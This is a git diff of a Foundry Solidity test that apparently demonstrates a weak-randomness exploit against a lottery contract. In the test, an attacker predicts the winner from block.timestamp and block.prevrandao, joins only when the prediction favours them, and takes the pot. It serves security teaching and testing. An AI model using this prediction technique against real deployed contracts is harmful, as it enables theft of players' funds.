@@ -2,63 +2,68 @@
 pragma solidity ^0.8.20;
 
 import "forge-std/Test.sol";
-import "../../src/v8/VulnerableLottery.sol";
+import "../../src/v8/Lottery.sol";
 
 contract WeakRandomness is Test {
-    VulnerableLottery lottery;
+    Lottery lottery;
+    address owner;
     address victim;
     address attacker;
 
     function setUp() public {
-        lottery = new VulnerableLottery();
-
+        console.log("=== SETUP ===");
+        owner = makeAddr("bob");
         victim = makeAddr("victim");
         attacker = makeAddr("attacker");
 
+        vm.deal(owner, 10 ether);
         vm.deal(victim, 10 ether);
         vm.deal(attacker, 10 ether);
 
-        // Players joins lottery
+        vm.prank(owner);
+        lottery = new Lottery();
+        console.log("  Lottery deployed\n");
+
+        // Victim joins lottery
         vm.prank(victim);
-        lottery.join{ value: 1 ether }();
-        vm.prank(attacker);
         lottery.join{ value: 1 ether }();
     }
 
     function testWeakRandomnessAttack() public {
-        console.log("=== WEAK RANDOMNESS ATTACK DEMO ===\n");
+        console.log("=== WEAK RANDOMNESS ATTACK ===");
         address[] memory players = lottery.getPlayers();
 
-        assertEq(players[0], victim);
-        assertEq(players[1], attacker);
+        console.log("[STEP 0] Initial state");
+        console.log("  Attacker balance:", attacker.balance / 1e18, "ETH\n");
 
-        // --- Attacker predicts randomness before calling pickWinner() ---
-
-        // Simulate randomness off-chain (same block)
+        console.log("[STEP 1] Randomness prediction");
+        console.log("  Attacker simulates randomness off-chain using block data");
         uint256 predicted = uint256(
             keccak256(
                 abi.encodePacked(
                     block.timestamp, // predictable
                     block.prevrandao, // predictable
-                    attacker // attacker plans to call pickWinner()
+                    owner // owner calls pickWinner()
                 )
             )
-        ) % players.length;
+        ) % (players.length + 1); // +1 because attacker will join
 
-        // Check that attacker WILL win (index 1)
+        console.log("  Expected winner index:", predicted, "\n");
         assertEq(predicted, 1);
 
-        console.log("Old attacker balance:", attacker.balance / 1e18, "ETH");
-
-        // --- Attacker executes the real transaction ---
+        console.log("[STEP 2] Attacker joins the lottery");
+        console.log("  players[0] = victim,  players[1] = attacker\n");
         vm.prank(attacker);
-        address actualWinner = lottery.pickWinner();
+        lottery.join{ value: 1 ether }();
 
-        // Confirm attacker won for real
-        assertEq(actualWinner, attacker);
+        console.log("[STEP 3] Lottery owner executes pickWinner()");
+        vm.prank(owner);
+        lottery.pickWinner();
+
+        // Confirm attacker won
+        assertEq(lottery.winner(), attacker);
         assertEq(attacker.balance, 11 ether); // attacker wins 2 ETH pot
-
-        console.log("Attacker won the lottery");
-        console.log("New attacker balance:", attacker.balance / 1e18, "ETH");
+        console.log("  Attacker won the lottery");
+        console.log("  Attacker balance:", attacker.balance / 1e18, "ETH\n");
     }
 }
